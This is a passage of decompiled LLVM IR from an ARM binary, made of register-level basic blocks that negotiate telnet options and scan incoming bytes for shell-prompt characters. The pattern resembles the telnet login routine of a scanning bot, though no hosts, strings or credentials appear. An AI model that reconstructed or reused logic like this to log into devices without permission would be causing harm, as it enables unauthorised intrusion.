  %v7_11664 = icmp eq i8 %v3_11688, 36
  store i1 %v7_11664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11664, label %dec_label_pc_11698, label %dec_label_pc_1166c

dec_label_pc_1166c:                               ; preds = %dec_label_pc_11664
  %v7_1166c = icmp eq i8 %v3_11688, 35
  store i1 %v7_1166c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1166c, label %dec_label_pc_11698, label %dec_label_pc_11674

dec_label_pc_11674:                               ; preds = %dec_label_pc_1166c
  %v7_11674 = icmp eq i8 %v3_11688, 37
  store i1 %v7_11674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11674, label %dec_label_pc_11698, label %dec_label_pc_1167c

dec_label_pc_1167c:                               ; preds = %dec_label_pc_11674
  %v1_1167c = add i32 %v0_11698, -1
  store i32 %v1_1167c, i32* %r0.global-to-local, align 4
  %v7_1167c = icmp eq i32 %v0_11698, 1
  store i1 %v7_1167c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1167c, label %dec_label_pc_10fd8thread-pre-split, label %dec_label_pc_11684

dec_label_pc_11684:                               ; preds = %dec_label_pc_11650, %dec_label_pc_1167c
  %v0_11698 = phi i32 [ %v1_1167c, %dec_label_pc_1167c ], [ %v1_11654, %dec_label_pc_11650 ]
  %v2_11684 = add i32 %v0_11698, %v0_11054
  store i32 %v2_11684, i32* %r3.global-to-local, align 4
  %v1_11688 = add i32 %v2_11684, 28
  %v2_11688 = inttoptr i32 %v1_11688 to i8*
  %v3_11688 = load i8, i8* %v2_11688, align 1
  %v4_11688 = zext i8 %v3_11688 to i32
  store i32 %v4_11688, i32* %r3.global-to-local, align 4
  %v7_1168c = icmp eq i8 %v3_11688, 62
  store i1 %v7_1168c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1168c, label %dec_label_pc_11698, label %bb312

bb312:                                            ; preds = %dec_label_pc_11684
  %v8_11690 = icmp eq i8 %v3_11688, 58
  store i1 %v8_11690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11690, label %dec_label_pc_11698, label %dec_label_pc_11664

dec_label_pc_11698:                               ; preds = %dec_label_pc_11684, %bb312, %dec_label_pc_11674, %dec_label_pc_1166c, %dec_label_pc_11664
  %v1_11698 = add i32 %v0_11698, 1
  store i32 %v1_11698, i32* @r7, align 4
  %v7_1169c = icmp eq i32 %v0_11698, -2
  store i1 %v7_1169c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1169c, label %dec_label_pc_10fd8thread-pre-split, label %dec_label_pc_116a4

dec_label_pc_116a4:                               ; preds = %dec_label_pc_11698
  %v2_116a4 = icmp eq i32 %v1_11698, 0
  store i1 %v2_116a4, i1* %cpsr_z.global-to-local, align 1
  %tmp313 = icmp slt i32 %v1_11698, 1
  br i1 %tmp313, label %dec_label_pc_11160, label %dec_label_pc_116ac

dec_label_pc_116ac:                               ; preds = %dec_label_pc_116a4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_116b0 = call i32 @function_11c08(i32 24)
  store i32 %v2_11270, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_116c0 = call i32 @function_11b24(i32 24, i32* nonnull %stack_var_-56)
  store i32 %v3_116c0, i32* %r0.global-to-local, align 4
  %v3_116c4 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_116c4, i32* %r2.global-to-local, align 4
  store i32 %v3_116c0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_116d0 = load i32, i32* @r5, align 4
  %v1_116d0 = add i32 %v0_116d0, 4
  %v2_116d0 = inttoptr i32 %v1_116d0 to i32*
  %v3_116d0 = load i32, i32* %v2_116d0, align 4
  store i32 %v3_116d0, i32* %r0.global-to-local, align 4
  %v4_116d4 = inttoptr i32 %v3_116c0 to i32*
  %v5_116d4 = call i32 @function_13700(i32 %v3_116d0, i32* %v4_116d4, i32 %v3_116c4, i32 16384)
  store i32 %v5_116d4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_116e4 = load i32, i32* @r5, align 4
  %v1_116e4 = add i32 %v0_116e4, 4
  %v2_116e4 = inttoptr i32 %v1_116e4 to i32*
  %v3_116e4 = load i32, i32* %v2_116e4, align 4
  store i32 %v3_116e4, i32* %r0.global-to-local, align 4
  %v6_116e8 = call i32 @function_13700(i32 %v3_116e4, i32* bitcast ([3 x i8]* @global_var_15750.34 to i32*), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_116f0 = call i32 @function_11b50(i32 24)
  store i32 %v1_116f0, i32* %r0.global-to-local, align 4
  %v0_116f4 = load i32, i32* @r5, align 4
  %v1_116f4 = add i32 %v0_116f4, 24
  %v2_116f4 = inttoptr i32 %v1_116f4 to i32*
  %v3_116f4 = load i32, i32* %v2_116f4, align 4
  store i32 %v3_116f4, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_116fc = add i32 %v0_116f4, 12
  %v3_116fc = inttoptr i32 %v2_116fc to i32*
  store i32 10, i32* %v3_116fc, align 4
  br label %dec_label_pc_11790

dec_label_pc_11704:                               ; preds = %dec_label_pc_11054
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11708 = call i32 @function_11c08(i32 26)
  store i32 %v2_11270, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_11718 = call i32 @function_11b24(i32 26, i32* nonnull %stack_var_-56)
  %v3_1171c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11718, i32* %r2.global-to-local, align 4
  %v1_11724 = add i32 %v3_1171c, -1
  store i32 %v1_11724, i32* %r3.global-to-local, align 4
  %v0_11728 = load i32, i32* @r8, align 4
  store i32 %v0_11728, i32* %r0.global-to-local, align 4
  %v0_1172c = load i32, i32* @r5, align 4
  %v1_1172c = add i32 %v0_1172c, 24
  %v2_1172c = inttoptr i32 %v1_1172c to i32*
  %v3_1172c = load i32, i32* %v2_1172c, align 4
  store i32 %v3_1172c, i32* %r1.global-to-local, align 4
  %v4_11730 = call i32 @function_125a0(i32 %v0_11728, i32 %v3_1172c, i32 %v3_11718, i32 %v1_11724)
  %v7_11734 = icmp eq i32 %v4_11730, -1
  store i1 %v7_11734, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_11730, i32* @r4, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11820 = call i32 @function_11b50(i32 26)
  br i1 %v7_11734, label %dec_label_pc_1181c, label %dec_label_pc_11740

dec_label_pc_11740:                               ; preds = %dec_label_pc_11704
  store i32 %v1_11820, i32* %r0.global-to-local, align 4
  %v0_11748 = load i32, i32* @r5, align 4
  %v1_11748 = add i32 %v0_11748, 4
  %v2_11748 = inttoptr i32 %v1_11748 to i32*
  %v3_11748 = load i32, i32* %v2_11748, align 4
  store i32 %v3_11748, i32* %r0.global-to-local, align 4
  %v1_1174c = call i32 @function_12e9c(i32 %v3_11748)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_11754 = load i32, i32* @r5, align 4
  %v2_11754 = add i32 %v1_11754, 4
  %v3_11754 = inttoptr i32 %v2_11754 to i32*
  store i32 -1, i32* %v3_11754, align 4
  store i32 ptrtoint (i32* @global_var_1e3f0.186 to i32), i32* %r3.global-to-local, align 4
  %v3_1175c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_1175c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e48c.198 to i32), i32* @lr, align 4
  %v2_11764 = load i32, i32* @global_var_1e3f0.186, align 4
  store i32 %v2_11764, i32* %r2.global-to-local, align 4
  %v4_11768 = mul i32 %v3_1175c, 4
  %v5_11768 = add i32 %v4_11768, ptrtoint (i8* @global_var_1e48c.198 to i32)
  %v6_11768 = inttoptr i32 %v5_11768 to i32*
  %v7_11768 = load i32, i32* %v6_11768, align 4
  store i32 %v7_11768, i32* %r3.global-to-local, align 4
  %v1_1176c = load i32, i32* %r0.global-to-local, align 4
  %v2_1176c = add i32 %v1_1176c, %v2_11764
  store i32 %v2_1176c, i32* %r2.global-to-local, align 4
  %v9_11770 = icmp eq i32 %v7_11768, %v2_1176c
  store i1 %v9_11770, i1* %cpsr_z.global-to-local, align 1
  %v7_11774 = icmp sgt i32 %v7_11768, %v2_1176c
  br i1 %v7_11774, label %dec_label_pc_11778, label %dec_label_pc_119a8

dec_label_pc_11778:                               ; preds = %dec_label_pc_11740
  store i32 %v1_1176c, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_11784 = load i32, i32* @r5, align 4
  %v1_11784 = add i32 %v0_11784, 24
  %v2_11784 = inttoptr i32 %v1_11784 to i32*
  %v3_11784 = load i32, i32* %v2_11784, align 4
  store i32 %v3_11784, i32* %ip.global-to-local, align 4
  %v3_11788 = add i32 %v0_11784, 284
  %v4_11788 = inttoptr i32 %v3_11788 to i8*
  store i8 0, i8* %v4_11788, align 1
  %v0_1178c = load i32, i32* %r1.global-to-local, align 4
  %v1_1178c = load i32, i32* @r5, align 4
  %v2_1178c = add i32 %v1_1178c, 12
  %v3_1178c = inttoptr i32 %v2_1178c to i32*
  store i32 %v0_1178c, i32* %v3_1178c, align 4
  br label %dec_label_pc_11790

dec_label_pc_11790:                               ; preds = %.thread198, %dec_label_pc_111cc, %dec_label_pc_11168, %dec_label_pc_119a8, %dec_label_pc_118b8, %dec_label_pc_116ac, %dec_label_pc_115f8, %dec_label_pc_11544, %dec_label_pc_114ac, %dec_label_pc_11318, %dec_label_pc_11264, %dec_label_pc_11778
  %v0_11790 = load i32, i32* %ip.global-to-local, align 4
  %v1_11790 = load i32, i32* @r7, align 4
  %v2_11790 = sub i32 %v0_11790, %v1_11790
  %v4_11790 = xor i32 %v1_11790, %v0_11790
  %v5_11790 = xor i32 %v2_11790, %v0_11790
  %v6_11790 = and i32 %v5_11790, %v4_11790
  %v7_11790 = icmp slt i32 %v6_11790, 0
  %v8_11790 = icmp slt i32 %v2_11790, 0
  %v9_11790 = icmp eq i32 %v0_11790, %v1_11790
  store i1 %v9_11790, i1* %cpsr_z.global-to-local, align 1
  %v2_11794 = xor i1 %v8_11790, %v7_11790
  %v0_11790.v1_11790 = select i1 %v2_11794, i32 %v0_11790, i32 %v1_11790
  store i32 %v0_11790.v1_11790, i32* %r1.global-to-local, align 4
  %v2_1179c = sub i32 %v0_11790, %v0_11790.v1_11790
  store i32 %v2_1179c, i32* @r2, align 4
  %v1_117a0 = load i32, i32* @r5, align 4
  %v2_117a0 = add i32 %v1_117a0, 24
  %v3_117a0 = inttoptr i32 %v2_117a0 to i32*
  store i32 %v2_1179c, i32* %v3_117a0, align 4
  %v0_117a4 = load i32, i32* @r8, align 4
  %v1_117a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_117a4 = add i32 %v1_117a4, %v0_117a4
  store i32 %v2_117a4, i32* @r1, align 4
  store i32 %v0_117a4, i32* @r0, align 4
  %v3_117ac = call i32 @function_134c0(i32 %v0_117a4, i32 %v2_117a4, i32 %v2_1179c)
  store i32 %v3_117ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11054

dec_label_pc_117b4:                               ; preds = %dec_label_pc_110d8
  store i32 ptrtoint (i32* @global_var_159cc.317 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_117c0, i32* @r0, align 4
  %v3_117c4 = call i32 @function_134b0(i32 %v2_117c0, i32 ptrtoint (i32* @global_var_159cc.317 to i32), i32 3)
  store i32 9, i32* @r2, align 4
  store i32 %v2_117d0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_159c3.319 to i32), i32* @r1, align 4
  %v3_117d8 = call i32 @function_134b0(i32 %v2_117d0, i32 ptrtoint (i32* @global_var_159c3.319 to i32), i32 9)
  store i32 %v3_117d8, i32* %r0.global-to-local, align 4
  %v0_117dc = load i32, i32* @r5, align 4
  %v1_117dc = add i32 %v0_117dc, 24
  %v2_117dc = inttoptr i32 %v1_117dc to i32*
  %v3_117dc = load i32, i32* %v2_117dc, align 4
  store i32 %v3_117dc, i32* %ip.global-to-local, align 4
  %v0_117e0 = load i32, i32* @r6, align 4
  %v1_117e0 = add i32 %v0_117e0, 2
  store i32 %v1_117e0, i32* %r2.global-to-local, align 4
  %v0_117e4 = load i32, i32* @r8, align 4
  %v2_117e4 = add i32 %v0_117e4, %v3_117dc
  store i32 %v2_117e4, i32* %r3.global-to-local, align 4
  %v9_117e8 = icmp eq i32 %v2_117e4, %v1_117e0
  store i1 %v9_117e8, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp ugt i32 %v2_117e4, %v1_117e0
  br i1 %tmp435, label %dec_label_pc_117f0, label %dec_label_pc_117b4.dec_label_pc_11150.loopexit_crit_edge

dec_label_pc_117b4.dec_label_pc_11150.loopexit_crit_edge: ; preds = %dec_label_pc_117b4
  %v0_11150.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11150

dec_label_pc_117f0:                               ; preds = %dec_label_pc_117b4
  %v0_117f0 = load i32, i32* @r4, align 4
  %v1_117f0 = add i32 %v0_117f0, 1
  %v2_117f0 = inttoptr i32 %v1_117f0 to i8*
  %v3_117f0 = load i8, i8* %v2_117f0, align 1
  %v4_117f0 = zext i8 %v3_117f0 to i32
  store i32 %v4_117f0, i32* %r3.global-to-local, align 4
  %v7_117f4 = icmp eq i8 %v3_117f0, 31
  store i1 %v7_117f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_117f4, label %dec_label_pc_1197c, label %dec_label_pc_117fc

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117f0
  %v1_117fc = add i32 %v0_117f0, -1
  %v2_117fc = inttoptr i32 %v1_117fc to i8*
  %v3_117fc = load i8, i8* %v2_117fc, align 1
  %v4_117fc = zext i8 %v3_117fc to i32
  store i32 %v4_117fc, i32* %r3.global-to-local, align 4
  %v7_11800 = icmp eq i8 %v3_117fc, -3
  store i1 %v7_11800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11800, label %.thread69, label %dec_label_pc_11810

.thread69:                                        ; preds = %dec_label_pc_117fc
  store i32 -4, i32* %r2.global-to-local, align 4
  store i8 -4, i8* %v2_117fc, align 1
  %v0_1180c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1180c.pr.pr, label %dec_label_pc_110ec, label %.thread69.dec_label_pc_11810_crit_edge

.thread69.dec_label_pc_11810_crit_edge:           ; preds = %.thread69
  %v0_11810.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11810

dec_label_pc_11810:                               ; preds = %.thread69.dec_label_pc_11810_crit_edge, %dec_label_pc_117fc
  %v0_11810 = phi i32 [ %v0_11810.pre, %.thread69.dec_label_pc_11810_crit_edge ], [ %v4_117fc, %dec_label_pc_117fc ]
  %v7_11810 = icmp eq i32 %v0_11810, 251
  store i1 %v7_11810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11810, label %bb316, label %dec_label_pc_110ec

bb316:                                            ; preds = %dec_label_pc_11810
  %v1_11814 = load i32, i32* %sl.global-to-local, align 4
  %v2_11814 = trunc i32 %v1_11814 to i8
  %v3_11814 = load i32, i32* @r4, align 4
  %v4_11814 = add i32 %v3_11814, -1
  %v5_11814 = inttoptr i32 %v4_11814 to i8*
  store i8 %v2_11814, i8* %v5_11814, align 1
  br label %dec_label_pc_110ec

dec_label_pc_1181c:                               ; preds = %dec_label_pc_11704
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11828 = call i32 @function_11c08(i32 25)
  store i32 %v2_11270, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_11838 = call i32 @function_11b24(i32 25, i32* nonnull %stack_var_-56)
  store i32 %v3_11838, i32* %r0.global-to-local, align 4
  %v3_1183c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11838, i32* %r2.global-to-local, align 4
  %v1_11844 = add i32 %v3_1183c, -1
  store i32 %v1_11844, i32* %r3.global-to-local, align 4
  %v0_11848 = load i32, i32* @r5, align 4
  %v1_11848 = add i32 %v0_11848, 24
  %v2_11848 = inttoptr i32 %v1_11848 to i32*
  %v3_11848 = load i32, i32* %v2_11848, align 4
  store i32 %v3_11848, i32* %r1.global-to-local, align 4
  %v0_1184c = load i32, i32* @r8, align 4
  store i32 %v0_1184c, i32* %r0.global-to-local, align 4
  %v4_11850 = call i32 @function_125a0(i32 %v0_1184c, i32 %v3_11848, i32 %v3_11838, i32 %v1_11844)
  store i32 %v4_11850, i32* @r7, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_1185c = call i32 @function_11b50(i32 25)
  store i32 %v1_1185c, i32* %r0.global-to-local, align 4
  %v0_11860 = load i32, i32* @r7, align 4
  %v7_11860 = icmp eq i32 %v0_11860, -1
  store i1 %v7_11860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11860, label %dec_label_pc_10fd4.loopexit, label %dec_label_pc_11868

dec_label_pc_11868:                               ; preds = %dec_label_pc_1181c
  %v2_11868 = icmp eq i32 %v0_11860, 0
  store i1 %v2_11868, i1* %cpsr_z.global-to-local, align 1
  %tmp317 = icmp slt i32 %v0_11860, 1
  br i1 %tmp317, label %dec_label_pc_11160, label %dec_label_pc_11870

dec_label_pc_11870:                               ; preds = %dec_label_pc_11868
  %v0_11870 = load i32, i32* @r5, align 4
  %v1_11870 = add i32 %v0_11870, 21
  %v2_11870 = inttoptr i32 %v1_11870 to i8*
  %v3_11870 = load i8, i8* %v2_11870, align 1
  %v4_11870 = zext i8 %v3_11870 to i32
  store i32 %v4_11870, i32* %r3.global-to-local, align 4
  %v1_11874 = add i32 %v0_11870, 20
  %v2_11874 = inttoptr i32 %v1_11874 to i8*
  %v3_11874 = load i8, i8* %v2_11874, align 1
  %v4_11874 = zext i8 %v3_11874 to i32
  store i32 %v4_11874, i32* %r2.global-to-local, align 4
  %v1_11878 = add i32 %v0_11870, 16
  %v2_11878 = inttoptr i32 %v1_11878 to i32*
  %v3_11878 = load i32, i32* %v2_11878, align 4
  store i32 %v3_11878, i32* %r1.global-to-local, align 4
  %v4_1187c = mul nuw nsw i32 %v4_11870, 256
  %v5_1187c = or i32 %v4_11874, %v4_1187c
  store i32 %v5_1187c, i32* %r2.global-to-local, align 4
  store i32 %v4_11870, i32* %r3.global-to-local, align 4
  store i32 %v3_11878, i32* %stack_var_-48, align 4
  store i32 %v5_1187c, i32* %stack_var_-38, align 4
  %v1_11890 = inttoptr i32 %v0_11870 to i32*
  %v2_11890 = load i32, i32* %v1_11890, align 4
  store i32 %v2_11890, i32* @sl, align 4
  %v0_11894 = call i32 @function_12ec8()
  store i32 %v0_11894, i32* %r0.global-to-local, align 4
  %v7_11898 = icmp eq i32 %v0_11894, -1
  %.325 = zext i1 %v7_11898 to i32
  store i32 %.325, i32* %r3.global-to-local, align 4
  %v2_118a4 = icmp eq i32 %v0_11894, 0
  store i1 %v2_118a4, i1* %cpsr_z.global-to-local, align 1
  %tmp320 = icmp slt i32 %v0_11894, 1
  br i1 %tmp320, label %bb321, label %.thread74

.thread74:                                        ; preds = %dec_label_pc_11870
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_118b8

bb321:                                            ; preds = %dec_label_pc_11870
  store i32 %.325, i32* @r6, align 4
  %v2_118b0 = icmp eq i1 %v7_11898, false
  store i1 %v2_118b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_118b0, label %dec_label_pc_119e4, label %dec_label_pc_118b8

dec_label_pc_118b8:                               ; preds = %.thread74, %bb321
  %v0_118b8 = load i32, i32* @r5, align 4
  %v1_118b8 = add i32 %v0_118b8, 4
  %v2_118b8 = inttoptr i32 %v1_118b8 to i32*
  %v3_118b8 = load i32, i32* %v2_118b8, align 4
  store i32 %v3_118b8, i32* %r0.global-to-local, align 4
  %v1_118bc = call i32 @function_12e9c(i32 %v3_118b8)
  store i32 %v1_118bc, i32* %r0.global-to-local, align 4
  %v0_118c0 = load i32, i32* @r5, align 4
  %v1_118c0 = add i32 %v0_118c0, 24
  %v2_118c0 = inttoptr i32 %v1_118c0 to i32*
  %v3_118c0 = load i32, i32* %v2_118c0, align 4
  store i32 %v3_118c0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_118c8 = load i32, i32* @r4, align 4
  %v2_118c8 = add i32 %v0_118c0, 4
  %v3_118c8 = inttoptr i32 %v2_118c8 to i32*
  store i32 %v0_118c8, i32* %v3_118c8, align 4
  %v0_118cc = load i32, i32* %r2.global-to-local, align 4
  %v1_118cc = load i32, i32* @r5, align 4
  %v2_118cc = add i32 %v1_118cc, 12
  %v3_118cc = inttoptr i32 %v2_118cc to i32*
  store i32 %v0_118cc, i32* %v3_118cc, align 4
  br label %dec_label_pc_11790

dec_label_pc_118d4:                               ; preds = %dec_label_pc_1147c, %dec_label_pc_11458, %dec_label_pc_11498
  store i32 %v3_11458, i32* %r1.global-to-local, align 4
  %v0_118d8 = load i32, i32* @r8, align 4
  store i32 %v0_118d8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15900.321 to i32), i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v5_118e4 = call i32 @function_125a0(i32 %v0_118d8, i32 %v3_11458, i32 ptrtoint ([8 x i8]* @global_var_15900.321 to i32), i32 7)
  store i32 %v5_118e4, i32* %r0.global-to-local, align 4
  %v3_118e8 = icmp eq i32 %v5_118e4, -1
  %v8_118e8 = icmp eq i32 %v5_118e4, -1
  store i1 %v8_118e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_118e4, i32* @r7, align 4
  br i1 %v3_118e8, label %dec_label_pc_10fd4.loopexit, label %dec_label_pc_114a4

dec_label_pc_118f8:                               ; preds = %dec_label_pc_10ff0
  br i1 %v2_11014, label %dec_label_pc_119d8, label %dec_label_pc_118fc

dec_label_pc_118fc:                               ; preds = %dec_label_pc_118f8
  %v3_118fc = icmp eq i32 %v5_11010, -1
  %v8_118fc = icmp eq i32 %v5_11010, -1
  store i1 %v8_118fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_118fc, label %dec_label_pc_11904, label %dec_label_pc_1103c

dec_label_pc_11904:                               ; preds = %dec_label_pc_118fc
  %v0_11904 = load i32, i32* @sb, align 4
  %v1_11904 = inttoptr i32 %v0_11904 to i32*
  %v2_11904 = load i32, i32* %v1_11904, align 4
  store i32 %v2_11904, i32* %r3.global-to-local, align 4
  %v7_11908 = icmp eq i32 %v2_11904, 11
  store i1 %v7_11908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11908, label %dec_label_pc_10e90, label %dec_label_pc_11910

dec_label_pc_11910:                               ; preds = %dec_label_pc_11904, %dec_label_pc_119d8
  %v0_11910 = load i32, i32* @r5, align 4
  %v1_11910 = add i32 %v0_11910, 4
  %v2_11910 = inttoptr i32 %v1_11910 to i32*
  %v3_11910 = load i32, i32* %v2_11910, align 4
  store i32 %v3_11910, i32* %r0.global-to-local, align 4
  %v1_11914 = call i32 @function_12e9c(i32 %v3_11910)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1191c = load i32, i32* @r5, align 4
  %v2_1191c = add i32 %v1_1191c, 4
  %v3_1191c = inttoptr i32 %v2_1191c to i32*
  store i32 -1, i32* %v3_1191c, align 4
  store i32 ptrtoint (i32* @global_var_1e3f0.186 to i32), i32* %r3.global-to-local, align 4
  %v3_11924 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_11924, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e48c.198 to i32), i32* %ip.global-to-local, align 4
  %v2_1192c = load i32, i32* @global_var_1e3f0.186, align 4
  store i32 %v2_1192c, i32* %r2.global-to-local, align 4
  %v4_11930 = mul i32 %v3_11924, 4
  %v5_11930 = add i32 %v4_11930, ptrtoint (i8* @global_var_1e48c.198 to i32)
  %v6_11930 = inttoptr i32 %v5_11930 to i32*
  %v7_11930 = load i32, i32* %v6_11930, align 4
  store i32 %v7_11930, i32* %r3.global-to-local, align 4
  %v1_11934 = load i32, i32* %r0.global-to-local, align 4
  %v2_11934 = add i32 %v1_11934, %v2_1192c
  store i32 %v2_11934, i32* %r2.global-to-local, align 4
  %v9_11938 = icmp eq i32 %v7_11930, %v2_11934
  store i1 %v9_11938, i1* %cpsr_z.global-to-local, align 1
  %v7_1193c = icmp sgt i32 %v7_11930, %v2_11934
  br i1 %v7_1193c, label %.thread81, label %dec_label_pc_1194c

.thread81:                                        ; preds = %dec_label_pc_11910
  store i32 0, i32* %lr.global-to-local, align 4
  %v9_11940 = load i32, i32* @r5, align 4
  %v10_11940 = add i32 %v9_11940, 12
  %v11_11940 = inttoptr i32 %v10_11940 to i32*
  store i32 0, i32* %v11_11940, align 4
  %v8_11944 = load i32, i32* %lr.global-to-local, align 4
  %v9_11944 = trunc i32 %v8_11944 to i8
  %v10_11944 = load i32, i32* @r5, align 4
  %v11_11944 = add i32 %v10_11944, 284
  %v12_11944 = inttoptr i32 %v11_11944 to i8*
  store i8 %v9_11944, i8* %v12_11944, align 1
  br label %dec_label_pc_10e90

dec_label_pc_1194c:                               ; preds = %dec_label_pc_11910
  %v0_1194c = load i32, i32* @r5, align 4
  store i32 %v0_1194c, i32* @r0, align 4
  %v0_11950 = call i32 @function_100f8()
  store i32 %v0_11950, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e90

dec_label_pc_11958:                               ; preds = %dec_label_pc_10fe0
  store i32 %.pre, i32* @r0, align 4
  %v1_11960 = add i32 %v0_11958, 92
  store i32 %v1_11960, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_11968 = call i32 @function_134c0(i32 %.pre, i32 %v1_11960, i32 192)
  store i32 %v3_11968, i32* %r0.global-to-local, align 4
  %v0_1196c = load i32, i32* @r5, align 4
  %v1_1196c = add i32 %v0_1196c, 24
  %v2_1196c = inttoptr i32 %v1_1196c to i32*
  %v3_1196c = load i32, i32* %v2_1196c, align 4
  store i32 %v3_1196c, i32* %r3.global-to-local, align 4
  %v1_11970 = add i32 %v3_1196c, -64
  store i32 %v1_11970, i32* %ip.global-to-local, align 4
  store i32 %v1_11970, i32* %v2_1196c, align 4
  br label %dec_label_pc_10ff0

dec_label_pc_1197c:                               ; preds = %dec_label_pc_117f0
  store i32 %v2_117c0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_1198c = add i32 %v0_117dc, 4
  %v2_1198c = inttoptr i32 %v1_1198c to i32*
  %v3_1198c = load i32, i32* %v2_1198c, align 4
  store i32 %v3_1198c, i32* %r0.global-to-local, align 4
  %v5_11990 = call i32 @function_13700(i32 %v3_1198c, i32* nonnull %stack_var_-41, i32 3, i32 16384)
  store i32 %v5_11990, i32* %r0.global-to-local, align 4
  store i32 %v2_10e24, i32* %r1.global-to-local, align 4
  %v0_11998 = load i32, i32* @r5, align 4
  %v1_11998 = add i32 %v0_11998, 4
  %v2_11998 = inttoptr i32 %v1_11998 to i32*
  %v3_11998 = load i32, i32* %v2_11998, align 4
  store i32 %v3_11998, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11130

dec_label_pc_119a8:                               ; preds = %dec_label_pc_11740
  %v0_119a8 = load i32, i32* @r5, align 4
  store i32 %v0_119a8, i32* @r0, align 4
  %v0_119ac = call i32 @function_100f8()
  store i32 %v0_119ac, i32* %r0.global-to-local, align 4
  %v0_119b0 = load i32, i32* @r5, align 4
  %v1_119b0 = add i32 %v0_119b0, 24
  %v2_119b0 = inttoptr i32 %v1_119b0 to i32*
  %v3_119b0 = load i32, i32* %v2_119b0, align 4
  store i32 %v3_119b0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_11790

dec_label_pc_119bc:                               ; preds = %dec_label_pc_10ef0, %dec_label_pc_10f2c
  %v0_119bc = load i32, i32* @r5, align 4
  %v1_119bc = add i32 %v0_119bc, 4
  %v2_119bc = inttoptr i32 %v1_119bc to i32*
  %v3_119bc = load i32, i32* %v2_119bc, align 4
  store i32 %v3_119bc, i32* %r0.global-to-local, align 4
  %v1_119c0 = call i32 @function_12e9c(i32 %v3_119bc)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_119c8 = load i32, i32* @r4, align 4
  %v1_119c8 = load i32, i32* @r5, align 4
  %v2_119c8 = add i32 %v1_119c8, 12
  %v3_119c8 = inttoptr i32 %v2_119c8 to i32*
  store i32 %v0_119c8, i32* %v3_119c8, align 4
  %v0_119cc = load i32, i32* %r0.global-to-local, align 4
  %v1_119cc = load i32, i32* @r5, align 4
  %v2_119cc = add i32 %v1_119cc, 4
  %v3_119cc = inttoptr i32 %v2_119cc to i32*
  store i32 %v0_119cc, i32* %v3_119cc, align 4
  %v0_119d0 = load i32, i32* @r4, align 4
  %v1_119d0 = trunc i32 %v0_119d0 to i8
  %v2_119d0 = load i32, i32* @r5, align 4
  %v3_119d0 = add i32 %v2_119d0, 284
  %v4_119d0 = inttoptr i32 %v3_119d0 to i8*
  store i8 %v1_119d0, i8* %v4_119d0, align 1
  br label %dec_label_pc_10e90

dec_label_pc_119d8:                               ; preds = %dec_label_pc_118f8
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_119dc = load i32, i32* @sb, align 4
  %v2_119dc = inttoptr i32 %v1_119dc to i32*
